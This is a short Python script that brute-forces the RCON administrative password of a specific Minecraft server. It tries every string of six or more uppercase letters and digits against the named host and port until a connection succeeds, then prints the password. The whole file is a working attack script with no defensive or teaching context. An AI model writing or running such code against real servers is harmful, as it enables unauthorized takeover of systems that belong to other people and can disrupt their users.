import string, itertools, os, mcrcon

characters = "UBCDEFGHIJKLMNOPQRSTAVWXYZ0123456789"

def iter_all_strings():
    length = 6
    while True:
        for s in itertools.product(characters, repeat=length):
            yield "".join(s)
        length +=1

for s in iter_all_strings():
	print(s)
	try:
		rcon = mcrcon.MCRcon()
		rcon.connect("craftyworld.leet.cc", 41177, s)
		print("true" + s)
		break
	except:
		t = 0